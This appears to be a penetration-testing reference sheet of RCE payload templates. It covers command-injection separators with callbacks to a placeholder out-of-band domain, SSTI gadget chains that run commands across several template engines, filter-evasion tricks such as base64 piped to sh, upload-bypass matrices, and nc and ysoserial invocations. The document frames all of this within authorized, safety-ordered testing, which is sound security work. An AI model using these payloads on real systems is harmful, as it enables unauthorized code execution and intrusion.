# Payloads & Templates — RCE

All payloads are templates with `<PLACEHOLDER>` slots. Fill them for the
specific engagement; never paste live third-party targets. The ladders here
are ordered by risk — climb only as far as authorization and impact proof
require.

## 0. Safe-first detection ladder

**Rule: the first signal is always an out-of-band callback to a domain or
collaborator you control. Never pop shells on third-party infrastructure as a
first step.** Climb in this order and stop as soon as you have two
independent signals:

1. **OOB DNS/HTTP callback** — zero impact, proves server-side processing.
   Use a unique path/token per test (`/rce-001`, `<TOKEN>`) so delayed or
   duplicate hits are attributable.
2. **Arithmetic/marker reflection** — `{{7*7}}`-style probes for SSTI/eval.
   Read-only, in-band.
3. **Time differential** — `sleep 3` vs `sleep 7` scaling. Short delays only.
4. **Read-only file/identity read** — `/etc/hostname`, `whoami`, `id`.
   Minimum proof of execution context.
5. **Impact ceiling for production** — one benign command. Stop. Do not dump
   credentials, do not read user data, do not persist.

Collaborator setup (templates):

```bash
# interactsh — OOB DNS + HTTP with full request logging
interactsh-client -v                      # note your <OOB_DOMAIN>

# Burp: Collaborator tab → "Copy to file" then poll
# Simple HTTP callback logger (if you control a public box)
python3 -m http.server 8000               # logs GETs; pair with a DNS log
# DNS-only probe without HTTP:
nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN> <YOUR_NS>
```

## 1. Command-injection differential templates

Baseline everything: send the benign value first (`host=example.com`), time it,
record the response shape. A finding is a *differential* against this baseline.

| Technique | Template (param value) | Signal | Notes |
|---|---|---|---|
| Terminator + OOB | `example.com;<PLACEHOLDER_OOB_DOMAIN>.<TOKEN>` | DNS/HTTP hit | Also try `\|`, `&&`, `\|\|`, `%0a`, `%0d%0a` separators |
| Subshell + DNS-only OOB | `$(nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN>)` | DNS hit | Prefer DNS-only before HTTP — fewer moving parts |
| Subshell + HTTP OOB | `` `curl http://<PLACEHOLDER_OOB_DOMAIN>/<TOKEN>` `` | HTTP hit | Backtick and `$(...)` variants both worth sending |
| Time-based A | `; sleep 3 #` | ~3s extra | Two values prove control: 3s then 7s must scale |
| Time-based B | `; ping -c 4 127.0.0.1 #` | ~3s extra | Works where `sleep` is missing (busybox images) |
| Windows time | `& ping -n 4 127.0.0.1 &` | ~3s extra | cmd.exe semantics; try `\|` and `%COMSPEC%` too |
| Language time | `'; import time; time.sleep(3); '` | ~3s extra | Python/PHP (`sleep(3)`) evaluator contexts |
| Output-based | `; id #` or `\| id #` | Reflected uid | Only after OOB confirms; one benign command |

Evasion encodings (try when the raw terminator is stripped — see §3 table):

- IFS splitting: `cat${IFS}/etc/hostname`
- Newline/tab separators: `%0a`, `%0d%0a`, `%09` instead of space
- Empty-string concatenation: `ca""t /etc/hostname`
- Brace expansion: `{cat,/etc/hostname}`
- Wildcard: `c?t /etc/hostname`
- Base64 pipe: `echo <B64_CMD> | base64 -d | sh`

Gotcha: `sleep` output vs app latency — noise from the app looks random;
controlled scaling (3s→7s→3s) is proof. Repeat the differential at least twice
before claiming.

## 2. SSTI fingerprinting ladder

**Stage 1 — marker arithmetic** (send each delimiter style; a computed `49`
means the input is template *source*, not a template *variable*):

```
{{7*7}}            ${7*7}            <%= 7*7 %>
#{7*7}             *{7*7}            #set($x=7*7)$x
```

If `{{7*7}}` reflects literally and `${7*7}` computes, the stack may be
Freemarker/Velocity-style — keep testing; literal echo is *not* a finding.

**Stage 2 — engine identification** (confirm which engine before crafting
anything deeper):

| Engine | Fingerprint probe | Expected tell |
|---|---|---|
| Jinja2 (Python) | `{{7*'7'}}` | `77777777` (Twig returns `49`) |
| Jinja2 alt | `{{config.items()}}` / `{{self}}` | Config/self dump or error naming Jinja |
| Twig (PHP) | `{{_self}}` | Twig environment dump (older versions leak `env`) |
| Freemarker | `<#assign x=7*7>${x}` | `49` via freemarker directives |
| Velocity | `#set($x=7*7)$x` | `49`; plain `${7*7}` usually stays literal |
| Pug (Node) | `#{7*7}` | `49`; also try `#{global.process}` errors |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Tornado (Python) | `{{1+1}}` | `2`; shares Python object model with Jinja |

**Stage 3 — read-only proof** (the impact proof, per the safe ladder — one
benign operation, nothing more):

```
Jinja2:  {{ cycler.__init__.__globals__.os.popen('whoami').read() }}
Twig:    {{ ['id']|filter('system') }}            (old Twig — lab versions)
Pug:     #{ global.process.mainModule.require('child_process').execSync('id') }
ERB:     <%= `whoami` %>
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}
```

Production rule: `whoami` or a marker-file read is the ceiling; deeper
gadget-walking (subclass enumeration, `_self.env` chains) belongs in a lab
container. Evasion notes: `|attr('...')` and `['__cla'+'ss__']`-style
concatenation dodge WAFs on dunder names; triple-URL-encode since template
chars are WAF-hot.

## 3. Encoder / obfuscation tricks

| Trick | Example | Bypasses |
|---|---|---|
| `${IFS}` separator | `cat${IFS}/etc/hostname` | Space filters |
| Encoded newline | `;%0acurl <OOB>` | Blocklists on `;` + space |
| Empty-string concat | `ca""t /etc/hostname` | Keyword denylists (`cat`) |
| Brace expansion | `{cat,/etc/hostname}` | Keyword denylists |
| Wildcard | `c?t /etc/hostname` | Keyword denylists |
| Base64 pipe | `echo <B64> \| base64 -d \| sh` | Almost all string filters |
| Double URL-encode | `%253b` | Double-decoding parsers |
| Case mixing (Windows) | `WhOaMi`, `cMd /c whoami` | Case-sensitive blocklists |
| Unicode dashes | `–output` (U+2013) vs `-` | Naive flag filters (rarely works — test, don't assume) |
| Nested Jinja | `{{ attr('\|attr') }}` chains, `__cla''ss__` | WAF dunder-name rules |

Honesty note: overlong UTF-8 and null-byte truncation (`shell.php%00.jpg`)
are dead on modern stacks — test once, don't build a report on them.

## 4. Upload-testing checklist

- [ ] Baseline: upload a valid minimal image with an embedded marker string;
      retrieve it from its storage URL; confirm integrity (re-encode check —
      recompression strips appended payloads, which kills many "findings").
- [ ] Extension matrix: `.php .phtml .php5 .php7 .phar .jsp .jspx .asp .aspx
      .cgi .pl`, double extensions (`shell.jpg.php`), case flips (`.PhP`),
      trailing dot/space (Windows), unicode-normalized chars.
- [ ] Content matrix: correct/wrong `Content-Type`, missing type, magic-byte
      polyglots (`GIF89a` + PHP/JSP polyglot body), zip/tar uploads.
- [ ] Bypass extras: null byte legacy (`x.php%00.jpg` — modern stacks: expect
      failure), `.htaccess` / `web.config` upload (handler remap), SVG (note:
      scripted SVG is stored XSS, not RCE — report accordingly).
- [ ] Storage-path guess: web root? predictable filename? predictable URL?
      Does the server serve uploads from a parsing handler (Apache
      AddHandler, nginx+php-fpm pathinfo)?
- [ ] Execution proof: one benign marker file, one GET, observe interpreter
      output. Then delete it or disclose — no shells left behind (guardrail).
- [ ] Second-order: is the uploaded file later *included* by the app? If yes,
      that is LFI→RCE — chain with `path-traversal-testing`.
- [ ] Zip slip / path traversal in archives → `path-traversal-testing`.

## 5. Tool invocation templates

```bash
# Param discovery for command/code sinks
ffuf -u 'https://<TARGET>/api/ping?param=FUZZ' -w params.txt -mr 'example' -t 30

# OOB hit confirmation with attribution
curl -s "https://<TARGET>/api/ping?host=example.com%3bnslookup%20<TOKEN>.<OOB_DOMAIN>"

# Callback listener during labs
nc -lvnp 9999

# Deserialization gadget probing — LAB/authorized targets only, never prod
ysoserial.net payloads: URLDNS (OOB-only proof), CommonsCollections* (RCE — lab)
phpggc -l                                   # list PHP gadget chains

# Upload fuzzing
ffuf -u 'https://<TARGET>/upload' -F 'file=@polyglot.gif;filename=shell.FUZZ' -w exts.txt
```

## 6. Chain it with

- **`ssrf-testing`** — if the sink fetches a URL rather than executing a
  string, you're on the wrong ladder: webhook/import/link-preview params,
  cloud metadata reachability, and DNS rebinding live there.
- **`path-traversal-testing`** — LFI→RCE: log poisoning + include,
  session-file inclusion, `php://`/`zip://` wrapper chains, archive slip
  landing a payload that V-04/V-08 then executes.
- **`info-disclosure-testing`** — leaked `.env` files, sourcemaps revealing
  sink code, and stack traces naming framework+version tell you which variant
  and which gadget classes exist. Redact any secrets you find — report the
  leak class, don't hoard the material.
- **`sandbox-escape-testing`** — if V-02/V-05 land you in a sandboxed context
  (vm2, PyJail, Java SecurityManager, Node `vm`, WASM), the escape playbooks
  live there; do not improvise escapes against production.
- Suite neighbors: `sqli-testing` (INTO OUTFILE / xp_cmdshell RCE pivots),
  `bac-idor-testing` (reaching admin-only injection sinks), `xss-testing`
  (client-side template injection is *not* SSTI — route it there).
